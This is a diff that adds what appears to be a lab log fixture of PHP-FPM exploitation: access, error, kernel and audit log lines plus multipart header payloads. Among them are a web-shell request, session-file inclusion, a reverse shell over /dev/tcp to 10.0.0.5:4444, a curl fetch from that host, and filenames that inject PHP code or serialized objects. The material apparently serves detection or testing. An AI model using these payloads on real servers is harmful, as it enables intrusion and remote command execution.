@@ -1,0 +1,31 @@
+10.0.0.5 - - [27/Oct/2026:04:11:58 +0700] "GET /missing.php HTTP/1.1" 404 199 "-" "Mozilla/5.0"
+10.0.0.5 - - [27/Oct/2026:04:12:01 +0700] "POST /index.php HTTP/1.1" 500 512 "-" "Mozilla/5.0"
+10.0.0.5 - - [27/Oct/2026:04:12:03 +0700] "POST /index.php HTTP/1.1" 503 199 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:12:04 +0700] "POST /index.php HTTP/1.1" 413 199 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:12:00 +0700] "GET /phpinfo.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+10.0.0.5 - - [27/Oct/2026:04:12:11 +0700] "GET /pwn.php?auth_pass=ZeroHackPersist2026&cmd=id HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:13:00 +0700] "GET /vuln.php?page=/tmp/sessions/sess_nucleiabc123def456ghi789 HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:13:03 +0700] "GET /?q0000000=v&q0000001=v&q0000002=v HTTP/1.1" 200 512 "-" "-"
+2026/10/27 04:12:04 [error] 1234#1234: *7 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 262144 bytes) in Unknown on line 0" while reading response header from upstream, client: 10.0.0.5, server: lab, request: "POST /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "lab"
+2026/10/27 04:12:05 [error] 1234#1234: *8 FastCGI sent in stderr: "PHP message: PHP Warning:  session_start(): Session ID is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,'" while reading response header from upstream, client: 10.0.0.5, server: lab, request: "POST /index.php HTTP/1.1"
+2026/10/27 04:12:05 [error] 1234#1234: *9 FastCGI sent in stderr: "PHP message: PHP Warning:  session_start(): Failed to read session data: files (path: /var/lib/php/sessions)" while reading response header from upstream, client: 10.0.0.5, server: lab, request: "POST /index.php HTTP/1.1"
+2026/10/27 04:12:05 [error] 1234#1234: *10 FastCGI sent in stderr: "PHP message: PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed" while reading response header from upstream, client: 10.0.0.5, server: lab, request: "POST /api/endpoint.php HTTP/1.1"
+2026/10/27 04:12:06 [alert] 1234#1234: *11 zend_mm_heap corrupted while reading response header from upstream, client: 10.0.0.5, server: lab, request: "POST /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000"
+[27-Oct-2026 04:12:07] WARNING: [pool www] child 4321 said into stderr: "NOTICE: PHP message: PHP Warning:  POST Content-Length of 134217728 bytes exceeds the limit of 8388608 bytes in Unknown on line 0"
+[27-Oct-2026 04:12:07] WARNING: [pool www] child 4321 said into stderr: "NOTICE: PHP message: PHP Warning:  Unknown: Multipart body parts limit exceeded 1000. in Unknown on line 0"
+Oct 27 04:12:06 web01 kernel: php-fpm8.2[991]: segfault at 7f00 ip 00007f00 sp 00007ffe error 4 in php-fpm8.2[55+0x1000]
+Oct 27 04:12:07 web01 kernel: Out of memory: Killed process 991 (php-fpm8.2) total-vm:123456kB, anon-rss:51200kB
+Oct 27 04:12:08 web01 audit: type=EXECVE msg=audit(1:99): argc=3 a0="/bin/sh" a1="-c" a2="id>/out/p1" exe="/usr/sbin/php-fpm8.2" ppid=991
+Oct 27 04:12:09 web01 audit: type=EXECVE msg=audit(1:100): argc=3 a0="/bin/sh" a1="-i" a2=">& /dev/tcp/10.0.0.5/4444 0>&1" exe="/usr/sbin/php-fpm8.2"
+Oct 27 04:12:10 web01 audit: type=EXECVE msg=audit(1:101): argc=4 a0="curl" a1="-s" a2="http://10.0.0.5/x" exe="/usr/sbin/php-fpm8.2"
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+Content-Disposition: form-data; name="PHPSESSID"
+Content-Disposition: form-data; name="PHPSESSID_EXTRA"
+Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS
+Content-Type: multipart/form-data; boundary=CCCCCCCCCC
+Content-Disposition: form-data; name="f"; filename="<?php echo 'marker'; ?>"
+Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}"
+Content-Disposition: form-data; name="f"; filename="%3C%3Fphp system($_GET[1]); ?>"
+auto_prepend_file=/tmp/sess_abc123def456
+HTTP/1.1 200 OK response body marker <<<P2S>>>uid=33(www-data)
+Content-Disposition:name=a[a][a][a][a][a][a][a][a][a][a][a];filename=
